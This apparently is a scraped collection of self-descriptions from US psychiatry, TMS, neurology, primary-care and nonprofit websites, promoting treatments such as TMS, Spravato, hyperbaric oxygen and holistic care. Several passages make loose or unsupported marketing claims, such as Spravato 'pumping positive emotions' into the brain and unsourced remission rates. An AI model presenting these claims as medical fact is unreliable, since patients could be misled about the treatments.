researching new ways to treat patients! If you aren’t satisfied or feel like your side hasn’t been heard, we want to help you. Give St. Cloud TMS a shot. Testing for genetic interactions to medications on the market. Holistic options proven effective to help patients with anxiety and depression. Providers that are interested in learning about new medications, prescribing when appropriate. If they don’t know the answer, they will research, not leave you hanging. Refer to sleep studies and interpret results. Specialty in psychiatric women's healthcare, including diagnosis and treatment of postpartum and menopausal causations. Dr. Das is board certified in Sleep Medicine in addition to psychiatry. With this specialty, he can order and interpret sleep studies. Easy, personal care for your sleep issues with someone who has a deep understanding of both the spiritual and scientific sides of this disorder is now at your fingertips. Additionally, Dr. Das is a certified Integrative Medicine provider. Interpreting who you are as a whole person, rather than treating multiple diagnoses offers the best option to full wellness. There might be an underlying answer to why you’re experiencing fatigue, anxiety, pain, depression, anger,etc. As a physician who is also interested in holistic options, Dr. Das will also request lab orders. Some medication might not work because genetically, you cannot process the drug. That’s where Genesight comes to play. The doctor orders your test and samples can be taken at your home or by stopping by the clinic for a quick swab. Genesight bills your insurance for the test, and they work out all the necessary steps to make sure patients pay very little of the actual cost. Over 95% of patients pay $330 or less for their test (most pay nothing). Test results can be a complete shock. It’s validating as an individual who has advocated for their health and has look of “you must be making this up” by countless providers. Want to know more about Genesight? Click the button below for more complete information. Spravato is an FDA, insurance covered treatment offered at Duluth TMS when other treatments aren’t doing the trick. This is prescribed to severely depressed patients who have been suicidal, who are suffering from PTSD, and TMS wasn’t the fix-all option for you. It also works wonders right after you’ve had TMS, because the synapses in your cerebral cortex are firing at a higher rate than typical. Spravato latches onto those new gateways and pumps positive emotions back into your brain. If you’re interested in this, one of our providers can do a quick assessment to verify that you meet all necessary criteria and can discuss the commitment. These appointments are about 2-hours, twice a week, and you cannot drive home after they are finished. Leah Good is a provider with compassion and knowledge to treat specific needs regarding this population. She has researched the limitations that this group will endure out of shame, misunderstanding, or untreated ailments that were never discussed. As a PMHNP, Leah can prescribe medication, use therapy within her medication management appointments, and order tests for underlying problems that might be causing these issues. She will come to you with a commitment to helping you find answers and listens to all sides of the issues. There is no shame with her at the helm. Step into the world of St. Cloud TMS Once you make an appointment, you won't regret it. We appreciate you taking the time to visit our site.  We'll review your message and be in touch with you soon. Refer a patient, friend, or make the decision for yourself to feel better. Contact us today to set up an initial free consultation with an Intake Coordinator. Duluth St. Cloud"

        "self_description": "Home Services About Contact More My name is Dr. Rafay S. Mehdi, and I am the Medical Director of Primary  & Preventive Care, Inc. ​ At Primary & Preventive Care, the wisdom of modern medical science meets the ancient wisdom of healing. ​ The human body is an extremely complicated machine that comes without a procedure manual. To me, being a doctor means being a teacher. While I will prescribe appropriate medicine, I believe that it’s important for me to teach you in simple layman’s terms about the human body including your symptoms, your disease process and your medications. Less is often more. The body has two main components, chemical and spiritual.  I make every attempt to heal both components.  To address this dichotomy, I rely on two very different traditions; modern medical science and ancient healing wisdom. Skillfully interweaving the best of both of these traditions allows me to treat my patients holistically, helping them to be active partners in their treatment and recovery. I grew up watching the popular television series, Little House on the Prairie. The Ingalls family may have been poor in material wealth, but they were rich in values depicting Positive Energy.  They epitomized a family that was old fashioned, hard working, innocent, organic, kind and very down to earth. In contrast, there was the Olson’s family; spoiled, overweight, and unkind; all values depicting Negative Energy. Is it any wonder they were not so well liked? Primary and Preventive Care is very much like The Little House on the Prairie. We strive to operate with the same intensity, integrity and devotion that the founding fathers used to forge and run this great country.  I personally admire those founding fathers, who used their higher consciousness to give us a constitution that governs over 300 million people of different race, color and origin allowing us all to live, work and celebrate life in a peaceful way under one system of democracy. ​ America is a country where dreams do come true. I feel I am living proof of the American Dream! I came to this country with 75 dollars in my pocket, without friends, family or a job.  I worked very hard; working my way day and night using the same system that was envisioned by the founding fathers of this country. ​ Primary and Preventive Care is not simply a primary care office, it is a healing center that your mind, body and soul has not only searched for, but deserves. My family comes from the East, with our healing traditions dating back many centuries.  Additionally, I was trained in Internal Medicine at Boston University, and I have served as a clinical instructor in medicine and faculty member at the Harvard Medical School Department of Medicine.  I have also undertaken preventive medicine training at a Yale University affiliated program.  As a result of this rich background of medical knowledge, I have learned that effective treatments consists in treating the whole patient, as opposed to just the symptoms or just the disease. ​ First, I always try to determine if I can use natural, evidence based treatments. If those are not successful – we can always try prescribing medications. But, first let’s try holistic and natural remedies for some acute, chronic physiological and psychological illnesses. I also like my patients to have access to me. This is why my patients have my personal cell phone number. A Luxury that only used to be availible to those who pay over-blown fees to concierge medical doctors. I tell all my patients, “Call me if you need me – calling me is like calling a family member.” ​ In the past seven years, I have performed over 50,000 medical exams. I have treated patients not only from the Boston area, but also many patients come from around the country. The success of PPC would not be possible without a highly devoted, loving, caring staff that have been with me for many years. This includes Maureen, Jessica, Briana, & Erich. ​ We all warmly welcome you to Primary and Preventive Care. We’re pleased and proud to have you as a member of the PPC family! Dr. Rafay S. Mehdi is a primary care physician in Boston, USA Fr. Clinical Instructor in Medicine at Harvard Medical School, USA Internal Medicine Boston at University School of Medicine, USA Preventive medicine at Yale University, USA Brain Research associate at the brain Research institute at UCLA, USA Clinical instructor for the Nurse Practitioner at Boston College and Simmons College Staff Physician at New England Baptist Hospital, USA Physical Medicine & Rehabilitation Residency at Spaulding Rehab Center, USA Staff Physician at South Shore Hospital and later a staff physician at Brockton Hospital, USA Dr. Mehdi is a medical director at Primary and Preventive Care in Hanover, MA Over the last ten years, Dr. Mehdi has attended over 85,000 medical visits. He is founder and CEO of an Assisted Living Services brand called House Calls in Boston, USA Dr Mehdi is the winner of the Patients Choice Award Dr. Mehdi is fluent in English, Spanish, Urdu, Russian and has started learning Chinese. Dr Mehdi has been working as a consultant for multiple retirement living facilities in the US for the past 15 years. Since 2006 Dr Mehdi has been featured on the lecture circuit at the major retirement and Asissted living facilities such as Wingate, Sunrise, Emeritus, Allerton House and Benchmark Since 2006 Dr Mehdi has been conducting research on retirement living facilities in China in multiple cities such as Shanghai, Ningbo, Beijing, Hungzhou, Hunan province, and most recently Nanjing Dr Mehdi research regarding the disabled in China and Physical Medicine feasibility is an ongoing research. This research and experience focuses on economics of Physical Medicine for disabled elderly in retirement homes as an added value proposition. Additionally, Dr Mehdi has been privately consulting with and advising retirees in these cities. Each consultation is done to optimize the 7 dimensions of the retirees health: Physical, Intellectual, Emotional, Spiritual, Social, Sexual, and Occupational. This has helped Chinese retirees and elderly maintain their lifestyles, their psyche, and optimize their health and well-being in the realm of primary and preventive care. Dr Mehdi has developed meaningful insights into the similarities and differences between the Chinese and American models for retirement living. These experiences have given Dr Mehdi a unique perspective on which components of the American retirement living system will work in China and which will fail. Dr Mehdi also has also given a series of highly regarded and entertaining lectures to Assisted Living residents in the US, and a separate series of lectures geared toward sibling of assisted living residents. Dr Mehdi is a highly sought after public speaker on topics such as safely aging, alternative and herbal medicine, acupuncture, and music therapy. ​ ​ ​"

        "self_description": "Transcranial magnetic stimulation (TMS) is an innovative treatment FDA approved for Treatment-Resistant Depression and Obsessive-Compulsive Disorder (OCD), and it is also used for the treatment of other Anxiety Disorders and Executive Function concerns seen in Autism Spectrum Disorder (ASD). This treatment uniquely uses pulses of magnetic energy to alter specific processes inside your brain, such as mood regulation, and is often targeted toward the area that controls Executive Function.  TMS is different from the more conventional treatments for these mental health disorders, such as psychotherapy and medications. However, it helps patients engage more in psychotherapy, and you can more easily achieve your health and wellness goals.  Typically, TMS offers improved symptoms or a complete elimination of symptoms. You can expect it to take a few weeks of consistent treatment to notice a significant improvement. TMS benefits two mental health disorders that Led Life Psychiatry specializes in managing. Depending on your health history and the success of your other treatments, your provider might recommend TMS for Treatment-Resistant Depression.  If the patient does not achieve complete elimination of symptoms within the first few weeks of treatment, the depression then tends to respond well to antidepressants and psychotherapy. If you don’t experience improvements from more conventional therapies, your provider might recommend TMS to relieve symptoms like hopelessness, sadness, fatigue, and suicidal thoughts.   Obsessive-compulsive disorder (OCD) OCD involves anxiety-driven uncontrolled thoughts called obsessions and compulsions, which are behaviors driven by your thoughts. The magnetic impulses target parts of the brain responsible for OCD symptoms. It can be intimidating to try a new treatment like TMS, especially if you’ve never tried any similar treatments that use energy. Fortunately, Led Life Psychiatry offers a warm and comfortable environment that makes the treatment both relaxing and enjoyable.  During treatment, you recline in a comfortable chair with a pair of earplugs in your ears. Your provider places an electromagnetic coil securely against your head, which switches on and off to produce electromagnetic pulses. To you, the pulses sound like a few seconds of tapping or clicking. The procedure takes about 30 minutes, and your provider can adjust the level of magnetic energy throughout the process. When you leave, you can return to your typical daily routine, including work and driving.  To find out more about TMS and if it fits into your care plan for OCD or depression, call us at Led Life at 507-533-5433 (507-LED-LIFE) or email us at Support@LedLifeLLC.com to book an appointment today. NO COST CONSULTATION: Meet with a patient consultant to learn about the TMS therapy treatment process and begin the insurance paperwork. EVALUATION: Meeting with one of our providers to further investigate whether TMS is right for you. FIRST APPOINTMENT: Our provider will identify the precise areas of your brain that control depression and anxiety, and establish your unique treatment settings on the TMS device TMS TREATMENT: Daily 19 minute sessions for approximately 6 weeks During your treatment you can read, watch tv or participate in therapeutic processes.  TMS requires no downtime. You can drive yourself to and from your session, and go home or go back to work.  Patients typically feel an improvement within 2-3 weeks and achieve remission of most symptoms within 6 weeks I spent decades in training on the brain and behavior in some of the most elite institutions in the US.  As a Psychiatrist, I’ve helped patients achieve what they couldn’t on their own – recovery from addictions and rediscovery of joy instead of depression and anxiety.  Then, I took a step away from the corporate career I had worked so hard to achieve. I did this because I didn’t just want a career, I wanted a calling.  I wanted to leave a legacy, including making time for the things that were most important, like my spirituality and my marriage, being available fully and present in the lives of my children, and helping others transform their lives by developing a mindset for growth and success. This was the driving force behind Led Life Concierge Psychiatry, where we “listen without labeling” and offer alternative treatments where other options have failed. We are now offering SPRAVATO® and Ketamine Assisted Psychotherapy (KAP) to help others rewrite their success stories and find joy in the journey.

She is a mom to two amazing twins, one of whom also wants to be a “feelings doctor” who is “good at technology” when she grows up. She is licensed in NY, MA, NJ, CA, MS and TX. TMS is very different from medications and talk therapy. Medications are not as customizable - they may not work for genetic reasons and could cause moderate to severe side effects. Symptoms of depression can interfere with the comfort and effectiveness of talk therapy. TMS is targeted to the part of the brain that regulates mood, treating depression as its neurological source.  It allows for more engagement in talk therapy and our office includes forms of talk therapy during treatments. The magnetic position and magnetic dose used in TMS therapy is customized to you during your first appointment. Side effects are typically limited to the treatment site, such as headaches or toothaches, rather than the entire body which can be seen with other treatments. During the session, you will feel a tapping sensation on your head. Each treatment session lasts around 19 minutes. Some patients experience mild to moderate headache or discomfort at or near the treatment site during the first week of treatment for which we have pain relief options. No, ECT induces a seizure and requires a hospital setting, anesthesia, and extended recovery time. ECT provides an electric current and is associated with side effects like memory loss, mood changes, and nausea. TMS is a magnetic pulse, not a shock, and the treatment is applied directly to the specific area of your brain that regulates mood.  TMS requires no hospitalization, anesthesia, or downtime, and has minimal side effects like scalp discomfort, headaches, or toothaches, for which we have pain relief options. SPRAVATO® was approved by the FDA in March 2019.  It is expected that many insurance providers will begin offering coverage for qualified patients.  As a first step, call us at 507-533-5433 (507-LED-LIFE) and our team here will help you navigate through the process.  In conjunction with Janssen CarePath (the maker of SPRAVATO®), will help you understand your insurance coverage and other possible affordability options. SPRAVATO® treatments are administered under the direct supervision of a medical doctor and the supporting medical staff at Led Life LLC. The treatments are administered in our office at 3355 St. Johns Lane, Ellicott City, MD. SPRAVATO® is not available for use outside the medical clinic. The main side effect of SPRAVATO include a temporary elevation of blood pressure. For this reason, you will be monitored for two hours and will have your blood pressure taking before, in the middle of, and at the end of treatment. We will walk you through the process and you can call us at 507-LED-LIFE  to learn more.

Bright Horizons Psychiatry Accessibility Statement We firmly believe that the internet should be available and accessible to anyone, and are committed to providing a website that is accessible to the widest possible audience, regardless of circumstance and ability. To fulfill this, we aim to adhere as strictly as possible to the World Wide Web Consortium’s (W3C) Web Content Accessibility Guidelines 2.1 (WCAG 2.1) at the AA level. These guidelines explain how to make web content accessible to people with a wide array of disabilities. Complying with those guidelines helps us ensure that the website is accessible to all people: blind people, people with motor impairments, visual impairment, cognitive disabilities, and more. This website utilizes various technologies that are meant to make it as accessible as possible at all times. We utilize an accessibility interface that allows persons with specific disabilities to adjust the website’s UI (user interface) and design it to their personal needs. Additionally, the website utilizes an AI-based application that runs in the background and optimizes its accessibility level constantly. This application remediates the website’s HTML, adapts Its functionality and behavior for screen-readers used by the blind users, and for keyboard functions used by individuals with motor impairments. If you’ve found a malfunction or have ideas for improvement, we’ll be happy to hear from you. You can reach out to the website’s operators by using the following email Our website implements the ARIA attributes (Accessible Rich Internet Applications) technique, alongside various different behavioral changes, to ensure blind users visiting with screen-readers are able to read, comprehend, and enjoy the website’s functions. As soon as a user with a screen-reader enters your site, they immediately receive a prompt to enter the Screen-Reader Profile so they can browse and operate your site effectively. Here’s how our website covers some of the most important screen-reader requirements, alongside console screenshots of code examples: Screen-reader optimization: we run a background process that learns the website’s components from top to bottom, to ensure ongoing compliance even when updating the website. In this process, we provide screen-readers with meaningful data using the ARIA set of attributes. For example, we provide accurate form labels; descriptions for actionable icons (social media icons, search icons, cart icons, etc.); validation guidance for form inputs; element roles such as buttons, menus, modal dialogues (popups), and others. Additionally, the background process scans all the website’s images and provides an accurate and meaningful image-object-recognition-based description as an ALT (alternate text) tag for images that are not described. It will also extract texts that are embedded within the image, using an OCR (optical character recognition) technology. To turn on screen-reader adjustments at any time, users need only to press the Alt+1 keyboard combination. Screen-reader users also get automatic announcements to turn the Screen-reader mode on as soon as they enter the website. These adjustments are compatible with all popular screen readers, including JAWS and NVDA. Keyboard navigation optimization: The background process also adjusts the website’s HTML, and adds various behaviors using JavaScript code to make the website operable by the keyboard. This includes the ability to navigate the website using the Tab and Shift+Tab keys, operate dropdowns with the arrow keys, close them with Esc, trigger buttons and links using the Enter key, navigate between radio and checkbox elements using the arrow keys, and fill them in with the Spacebar or Enter key.Additionally, keyboard users will find quick-navigation and content-skip menus, available at any time by clicking Alt+1, or as the first elements of the site while navigating with the keyboard. The background process also handles triggered popups by moving the keyboard focus towards them as soon as they appear, and not allow the focus drift outside it. Users can also use shortcuts such as “M” (menus), “H” (headings), “F” (forms), “B” (buttons), and “G” (graphics) to jump to specific elements. We aim to support the widest array of browsers and assistive technologies as possible, so our users can choose the best fitting tools for them, with as few limitations as possible. Therefore, we have worked very hard to be able to support all major systems that comprise over 95% of the user market share including Google Chrome, Mozilla Firefox, Apple Safari, Opera and Microsoft Edge, JAWS and NVDA (screen readers). Despite our very best efforts to allow anybody to adjust the website to their needs. There may still be pages or sections that are not fully accessible, are in the process of becoming accessible, or are lacking an adequate technological solution to make them accessible. Still, we are continually improving our accessibility, adding, updating and improving its options and features, and developing and adopting new technologies. All this is meant to reach the optimal level of accessibility, following technological advancements. For any assistance, please reach out to"

        "self_description": "Cummins Behavioral Health Systems, Inc. is a community mental health center providing behavioral health services in Boone County, Hendricks County, Marion County, Montgomery County, Putnam County, and surrounding areas in Central and West Central Indiana. Established in 1972, Cummins provides behavioral health services to persons of all ages in a variety of office, school, and community-based settings. As a managed care provider certified by the Indiana Division of Mental Health and Addiction, Cummins offers a wide continuum of services to individuals, families, and communities, focused upon building resiliency and achieving recovery. Cummins has a goal to be the provider of choice for persons seeking behavioral health services, behavioral health professionals looking to grow in their careers, and community organizations seeking a partner in behavioral health services. The mission of Cummins Behavioral Health Systems Inc. is to inspire the hope of recovery; to achieve excellence in all aspects of care; and to make the goals and aspirations of those we serve our highest priority. As a result of our personal leadership and of our partnerships with those we serve: We believe every person deserves access to high-quality behavioral health care regardless of where they live or their ability to pay for services. We strive to achieve the highest outcomes possible for the individuals we serve, working together with them to create treatment plans that reflect their desired goals. We tailor our services to match the individuals receiving them, with careful attention given to their unique needs and wishes as well as their personal challenges and strengths. We aspire to be an organization at which behavioral health professionals can learn and grow in their craft while also serving their community. We believe strongly in staying up to date with the latest best practices and models of care, and we provide training opportunities for our staff members to expand their clinical toolsets. We also place a strong emphasis on staff health and wellness, because we believe practitioners must attend to their own health and wellness before they can assist others. We strive to be a trusted behavioral health partner and information source for the communities we serve. We routinely partner with local organizations to provide in-person training, instruction, and guidance on a wide variety of behavioral health and wellness topics. We also maintain a digital archive of behavioral health resources that can be accessed and utilized at no cost to individuals or organizations. My child looks forward to meeting with both service providers. They both make him feel comfortable and help him work through things at his pace. I feel heard and not minimized. I feel trusted in that I know myself enough to know what I need, and that makes me trust the provider. The ladies that work with my child are the best, and I couldn't ask for a better team. Cummins has been a lifesaver for me. I have never been more comforable talking to a counselor before. Anyone who has been involved with my son's care has gone above and beyond to help him and us as a family, and I couldn't be more grateful for everyone. Everyone here is so helpful, thoughtful, and caring about my life. I don't know where I would be without them. We work with third party payers such as Medicaid, Medicare, and Tricare as well as other organizationally-approved payers. Persons seeking services may also pay for treatment out-of-pocket utilizing the organizational sliding scale. Cummins Behavioral Health Services is a Joint Commission accredited organization."

        "self_description": "Home | Patient Portal | Take A Quiz Depression, specifically Major Depressive Disorder (MDD), is far more than just feeling sad. It's a pervasive and debilitating mental health condition characterized by persistent feelings of sadness, loss of interest or pleasure in activities once enjoyed, changes in appetite or sleep patterns, fatigue, feelings of worthlessness or guilt, difficulty concentrating, and thoughts of death or suicide. Major Depression Disorder impacts millions of lives globally, profoundly affecting an individual's work, relationships, and overall quality of life. Unlike temporary sadness, the symptoms of MDD persist for at least two weeks and significantly interfere with daily functioning. The exact causes of depression are complex, involving a combination of genetic predisposition, biological factors (like imbalances in brain chemicals or neural circuit dysfunction), environmental stressors, and psychological factors. While anyone can experience depression, certain life events or personal circumstances can increase vulnerability. Recognizing MDD is the first step towards seeking effective treatment and regaining control over one's life. For many individuals, particularly those with treatment-resistant depression (who have not found relief from multiple antidepressant medications), conventional approaches may fall short, leaving them in a cycle of persistent symptoms and frustration. Deep TMS has been rigorously tested in multi-center studies, including pivotal trials that led to its FDA clearance, demonstrating its remarkable efficacy: High Response Rates: Real-world data shows that approximately 82% of patients achieved a response, meaning a significant (50% or more) reduction in their depressive symptoms. High Remission Rates: Even more impressively, about 65% of patients achieved full remission, signifying a near-complete resolution of their depressive symptoms. This is particularly notable for patients who had failed numerous previous medication trials. Rapid Onset of Effect: Many patients begin to experience a noticeable improvement in their depression symptoms relatively quickly, often within 2 to 3 weeks of starting treatment. Sustained Benefits: The positive effects of Deep TMS treatment can be durable, with patients maintaining their antidepressant effect for extended periods after the acute treatment phase. Well-Tolerated: Deep TMS is generally well-tolerated, with common side effects being mild and transient, such as temporary scalp discomfort or headache during sessions. It avoids the systemic side effects often associated with antidepressant medications (e.g., weight gain, sexual dysfunction, memory loss, sedation). See if you Qualify Today!

We integrate advanced treatments, pioneering research, and a patient-centered approach to enhance brain health, promote longevity and improve the quality of life of individuals with neurological conditions. Lenny Cohen, MD Founder of Chicago Neurological Services Dr. Lenny Cohen is a board certified Neurologist and has seen and treated thousands of individuals over the last 18 years. His main practice, Chicago Neurological Services (CNS) focuses on organic brain disorders; from simple headaches to Depression, Obsessive Compulsive Disorder (OCD), Multiple Sclerosis, Stroke, Neuropathies, Alzheimer’s and individuals suffering from Parkinson's Disease. Allopathic medicine, otherwise known as western-medicine, has been on the front-line of his training and practice however, the more he practices, the more limitations he sees in a western-centric approach. Several years ago, he dove deep into alternative methods during his father’s battle with Alzheimer’s. Western medicine was failing his quick progression. He experienced first-hand the painful limitations and weaknesses of a western-only medical approach and it was only after his passing that he incorporated alternative therapies into his practice – specifically hyperbaric oxygen therapy (HBOT). In 2015, Dr. Cohen incorporated hyperbaric therapy into his practice with the goal of improving brain wellness and prolonging brain longevity. His research and approach to brain wellness and longevity is based on hundreds of scientific studies, reviews and analyses from around the world. As the only standalone medical center in the city of Chicago with medical-grade hyperbaric chambers, hyperbaric therapy at CNS has become the leading authority in hyperbaric treatments in the Midwest. To expand on the care of his patients needing infusions, in 2019 Dr. Cohen launched an IV infusion suite offering infusions for cancer, multiple sclerosis, autoimmune disorders and migraine therapy as well as IV vitamins, alpha-lipoic acid and NAD+ infusions. With new discoveries in healthcare, Dr. Cohen brings them to his patients. The newest addition to his practice is Transcranial Magnetic Stimulation (TMS) which is FDA-approved for depression and OCD. TMS is also currently in use for a variety of neurological conditions as a part of research. The integrative collaboration of all three practices is a gamechanger in the new world of brain wellness and longevity. Dr. Cohen has helped countless patients live optimal lives, providing care, resources and options for all of us to live longer optimal lives. Treating Alzheier’s, Parkinson’s, Neuropathy, Multiple Sclerosis and more Neurology is a medical specialty focused on diagnosing and treating disorders of the nervous system. Our Dr. Lenny Cohen addresses conditions affecting the brain, spinal cord, and nerves. While Dr. Cohen specializes in treating these specific issues, he often work alongside the primary care physician, who oversees the patient’s overall health and well-being and may also serve as a consultant for more complex neurological concerns. He listens to all of the issues associated with your reason for visit & runs appropriate tests. I would highly recommend Dr. Cohen for any neurological services.\" \"He spent a great deal of time learning about  medical history & current health issues. We felt very confident that we were in great hands. Highly recommend this him!\" \"Dr. Cohen was great & answered all of my questions.  He also went over all my medications & medical history to make sure oxygen treatment was safe for me.\" © Copyright 2025 Tebra Inc . Medical website powered by Tebra"

This model has grown from a single provider in two facilities, to now 15 providers in nearly 65 facilities in Illinois and Kentucky - and still growing! After two and a half years of research and development, Nathan  identified a significant need for a comprehensive program specifically structured for professional, collegiate, and competitive pre-collegiate athletes. From this, Integrative Athletic Enhancement (IAE) was created. Nathan  is a Frank G. Dickey Fellow of the University of Kentucky and is an avid University of Kentucky athletics supporter. He is also a fervent Chicago Bears and Chicago White Sox fan, having now lived in the Chicagoland area since 2000.

I believe that our experiences help to inform us about the life that we want to create for ourselves. In doing this work, I believe that all people have a purpose and that we should demonstrate compassion towards ourselves and others as we work toward discovering it. As your counselor, my approach is to be a kind and compassionate presence, while also using humor as a healing tool to help you discover your purpose, rediscover who you are, or assist you in defining a new you in an empathetic and curious way. We co-create an environment of exploration by finding ways to encourage authenticity in our healing space while exploring root causes of learned behaviors. During our process, we can also do work to untether you from patterns and thinking that no longer serve you while working toward a redefined future. We do this work by gently challenging these patterns, and by providing direct feedback in moments in which we can alter these thought processes. I strongly believe in the practice of empowerment, solution-focused strategies, and trauma-informed mindfulness as we go through this journey of aligning our mind, body, and spirit. I have experience working with people from all walks of life, and I really enjoy doing work with people who are first-time clients, college students, or those who have concerns with Anxiety, Depression, Trauma, Relationships, Divorce, Non-Traditional Relationships, Spirituality/Religion, Self Esteem/Self Compassion work, Identity Development, and Adjustment Issues. I received my formal education in Clinical Mental Health Counseling , as well as Adult and Higher Education from Northern Illinois University. Go Huskies! In addition to my clinical care career exploration, I have worked in Colleges and Universities for over a decade supporting advocacy efforts geared toward intimate partner violence, holistic need care through case management services, mental health crisis care, university administrative efforts, and classroom teaching. Outside of the therapeutic space, I enjoy spending time with my loving Husband and our furry baby Ella. I love all things Wizard of oz, finding excuses to go to Target, laughing, cooking, and serving in Ministry. It is my greatest honor to support you on this wellness journey, and I am looking forward to seeing you in session soon! 1-800-461-9533 11231 Distinctive Drive Orland Park, IL 60467 © Copyright 2018.

Mercer Medicine began in 2005 at the Mercer University campus in Macon and has since expanded across Georgia. In 2014, Mercer Medicine moved into its current Macon headquarters at 250 Martin Luther King Jr. Boulevard, the site of the former Georgia Music Hall of Fame. In August 2018, the first of Mercer Medicine’s rural clinics opened in Plains, Georgia, with the support of former U.S. President Jimmy Carter and former First Lady Rosalynn Carter. President Carter, who is a Life Trustee at Mercer, and Mrs. Carter prompted discussion of plans to bring a medical clinic back to Plains upon the closing of the Plains Medical Center in March 2018. Just a few months later, Mercer Medicine Plains opened its doors and has been the model for the Mercer Medicine clinics that have opened since. In order to continue delivering on its commitment to meet the healthcare needs of rural Georgians, Mercer Medicine opened rural health clinics in Peach County in October 2019 (moved to Taylor County), Clay County in November 2020, Putnam County in March 2021, Harris County in April 2022, Glynn County in September 2023, and Taylor County in October 2023 with additional clinic locations in development. View our locations Georgia ranks 44 nationally in the number of active primary care physicians and suffers from a severe maldistribution of physicians: Mercer Medicine’s goal is to improve those numbers by opening high-quality medical offices across rural Georgia. Bringing primary care to a rural community improves not only the quality of health outcomes, but the overall quality of life as well. A physician in a rural community brings in 2.3 million in economic development. Mercer Medicine works closely with community partners to increase the collective impact of our work. Thanks to immense support from the Georgia State Legislature and leaders across our rural communities, Mercer Medicine is extending its reach throughout Georgia.

Frontline Response, a Christian-based non-profit headquartered in the heart of Atlanta, serves on the frontlines every day rescuing men and women out of sex trafficking and homelessness and preventing vulnerable children from falling victim. Founded in 2003, Frontline Response began with a heart for the frontlines – always seeking to find a need and meet it. Since incorporating in 2006, Frontline Response has assisted nearly 1,500 victims out of sex trafficking and transitioned over 1,000 men, women, and children out of homelessness. In 2018, the organization added youth prevention to its mission and has provided prevention programming to more than 600 youth facing adversity in overlooked communities throughout Metro Atlanta. Frontline Response has developed a prototype for outreach, rescue, and emergency safe housing in the fight against sex trafficking that is sought after nationally. The organization has provided training to law enforcement, fire departments, emergency rooms, and judges; helped lead anti-trafficking efforts around large events including the Super Bowl in numerous cities; and advocated for state legislative and policy changes that have seen Georgia rise from the grade of a “C” to having the 4th best laws in the nation, according to Shared Hope International. Frontline Response holds a Platinum Level ranking from GuideStar, the world’s largest source of information on nonprofit organizations, and serves under the leadership of an 18 -member Board of Directors comprised of business leaders throughout greater Atlanta. \"We are on the frontlines every day rescuing individuals out of the darkness of sex trafficking and homelessness while preventing children and other vulnerable individuals from falling victim.\" The act of helping get people out of circumstances or situations that they are unable to get out of on their own. It first requires the desire of the person to leave the circumstance or situation, and then we partner with them in the process of leaving. It is not a patronizing or disempowering act, but instead honors the strength and courage of individuals by helping them fulfill the choices they have made.

The importance of alcohol and drug outpatient rehab programs in the continuing success of our rehabilitating patients. The goal of the Intensive Outpatient Program (IOP) is for the patient to continue to be supported in their commitment to abstinence in order to maintain a life free from drugs and alcohol. IATAC psychosocial rehabilitation programs utilize the Role Recovery Model to treat the symptoms of mental illness. The Role Recovery Model focuses all service planning and delivery on assisting persons served to develop the stability, confidence, knowledge, skills, and supports. IATAC offers Transcranial Magnetic Stimulation (TMS), an FDA-approved, non-invasive treatment that uses magnetic fields to gently stimulate nerve cells in the brain. TMS can effectively improve symptoms for those struggling with major depression, obsessive-compulsive disorder (OCD), and even aid in smoking cessation, especially when other treatments haven't provided sufficient relief. It involves delivering repeated magnetic pulses, known as repetitive TMS. 1 (844) 420-3600 Website by Scribe"

Most health issues are multi-factorial, meaning it goes beyond genetics, encompassing life-style, environmental, metabolic pathways, vitamin, hormone and toxin levels. Many biochemical processes affect disease and aging, including oxidation, inflammation, detoxification and others. Only when all of those variables are corrected in a unified program can prevention, healing or regeneration happen. Dr. Adonis believes that we need a balance of our body, mind and spirit to accomplish a healthy and fulfilled life. Dr. Adonis is dual-certified in Functional Medicine and Anti-Aging Regenerative Medicine.

        "self_description": "As a Sussex County native, I am excited to start my own practice and have the opportunity to care for those living and moving to the Cape region! I was born in Philadelphia and grew up just outside of Lewes. As a Cape Henlopen graduate and field hockey state champion, I pursued my dream of playing field hockey as a D1 athlete at Syracuse University. I went on to graduate with my Bachelor of Arts Degree in Business from Assumption College in Massachusetts and started my career in banking at WSFS, Wilmington Savings Fund Society in Lewes, DE. In addition to working at the bank, I enjoyed participating in non-profit community programs in Sussex County including Meals on Wheels and Teach Children to Save. It was during this time of helping others, my desire to focus on the medical needs of the community began. In doing so, I decided to leave banking and pursue my dream of becoming a nurse. With my mother being a nurse and my father an internal medicine physician since my childhood, I was inspired by their constant dedication and commitment to their patients. Their guidance, advice, and knowledge were instrumental as I returned to nursing school and graduated from Delaware Technical Community College in 2014. For the past seven years, I have worked for Beebe Healthcare in their Emergency Room and Behavioral Health Department. In that time, I continued to learn and advance in my career as a nurse. I found myself desiring to give more to my patients and decided to return to school once again. While continuing to work at Beebe, I completed my Bachelor of Science Degree in Nursing in 2018 and my Master of Science Degree in Nursing with a concentration of Family Nurse Practitioner in 2021.  As my advanced nursing career continues to unfold, I completed a Post Master’s Degree as a Psychiatric Mental Health Nurse Practitioner (PMHNP) in 2023. Many patients are suffering from mental health issues and I feel this is where my true passion lies. I enjoy traveling and spending time with my daughter Hailey.  Relaxing on the beach in Lewes and Ocean City with my family is where you can find me in the summer. Finally, I am an avid Philadelphia sports fan and love supporting the Eagles. Win or Lose, GO BIRDS! I'm Coach Nil and I am delighted to introduce myself as a warm and empathetic Board Certified Health & Wellness Coach dedicated to helping you unlock your full potential. Migrating to the US at age 10 and always feeling like I didn’t fit in, made me curious about the human psyche and I pursued a degree in Psychology. My deep intuition allows me to truly understand your unique needs, fears and aspirations, My approach is rooted in patience and understanding, ensuring that you feel supported and heard every step of the way. Together, we will navigate the challenges you face, celebrate your successes, and work towards achieving your goals with confidence and clarity. Friends and family always confided in me and felt that I could 'get them'. I realized that I had a gift, and wanted to have a toolbox of approaches to help anyone who was ready to make the change they needed, whether in their health, relationships or self-care. I hold a Holistic MBA in Health & Wellness, and training in Life Coaching. I further trained to get my ICF & National Board Certification in Health and wellness. I offer tele-medicine so you can be in the comfort of your own space. It’s been very effective with my clients.

This was at a time when very few psychiatrists were interested in geriatrics or setting foot in a skilled nursing facility. I found that I loved working with the elderly. It was endlessly challenging, requiring the use of all my skills and training. It also forces one to keep up with general medicine, which I think is essential to practicing psychiatry as well.” – Martin Cooper MD FAAP Medical Director, Co-Owner CMHS At CMHS, we are dedicated to creating a supportive and encouraging space for seniors and their families in Connecticut.

